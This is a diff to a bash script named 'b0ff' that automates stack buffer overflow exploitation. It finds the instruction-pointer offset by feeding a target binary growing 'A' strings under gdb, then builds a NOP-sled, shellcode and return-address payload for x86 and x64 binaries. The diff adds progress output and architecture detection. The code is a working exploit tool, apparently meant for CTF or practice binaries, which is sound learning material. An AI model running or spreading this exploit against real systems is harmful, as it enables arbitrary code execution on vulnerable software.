@@ -4,9 +4,9 @@
 
 function help(){
 
-	printf "Usage bash b0ff <binary> <buffer> <arch>\n"
-	printf "Examples:  bash b0ff ./bin 600 x86\n"
-	printf "           bash b0ff ./bin 1000 x64\n"
+	printf "Usage bash b0ff <binary> <start> <buffer limit>\n"
+	printf "Examples:  bash b0ff ./bin 30 600\n"
+	printf "           bash b0ff ./bin 1 1000\n"
 	exit
 
 }
@@ -21,8 +21,8 @@ COL_GREEN="\e[0;32m"
 COL_END="\e[0m"
 
 binary="$1"
-start=1
-end="$2"
+start="$2"
+end="$3"
 
 # Change shellcodex86 and shellcodex64 variable values for your shellcode, defaults values are the following
 # source https://shell-storm.org/shellcode/index.html
@@ -35,18 +35,20 @@ function x86(){
 
 	for ((i=$start;i<=$end;i++))
 	do
-		
+		tput civis
+		printf "%s \r" "${i}"
 		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x41414141 in ?? ()') == "0x41414141 in ?? ()" ]]
 		then
-
+			tput cnorm
+			printf "[${COL_GREEN}EIP${COL_END}] $i\n"
 			shellcode=$shellcodex86
 			p_len=$(printf $shellcode | wc -c)
 			offset=$(($i-4-$p_len))
 			printf "[${COL_GREEN}SHELLCODE${COL_END}] "
 			echo $shellcode | tr -s '\\' '\\\\'
 			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
-			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
-			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*4)')" -ex 'x/'$end'wx $esp' $binary --batch | grep '0x90909090' > /tmp/memories
+			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"		
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*4)')" -ex 'x/'$end'wx $esp' $binary --batch 2>/dev/null | grep '0x90909090' > /tmp/memories
 			# 13p can fail due address loc, needs to be a variable
 			mem=$(sed -n '13p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
 			address=$(echo ${mem:12:4}${mem:8:4}${mem:4:4}${mem:0:4})
@@ -67,10 +69,13 @@ function x64(){
 
 	for ((i=$start;i<=$end;i++))
 	do
+		tput civis
+		printf "%s \r" "${i}"
 
 		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x0000414141414141 in ?? ()') == "0x0000414141414141 in ?? ()" ]]
 		then
-
+			tput cnorm
+			printf "[${COL_GREEN}RIP${COL_END}] $i\n"
 			shellcode=$shellcodex64
 			p_len=$(printf $shellcode | wc -c)
 			offset=$(($i-6-$p_len))
@@ -96,12 +101,14 @@ function x64(){
 
 }
 
-if [[ "$3" == 'x86' ]]
+if [[ $(file $binary | grep -o 32-bit) == '32-bit' ]]
 then
+	printf "[${COL_GREEN}ARCH${COL_END}] x86\n"
 	x86
 fi
 
-if [[ "$3" == 'x64' ]]
+if [[ $(file $binary | grep -o 64-bit) == '64-bit' ]]
 then
+	printf "[${COL_GREEN}ARCH${COL_END}] x64\n"
 	x64
 fi
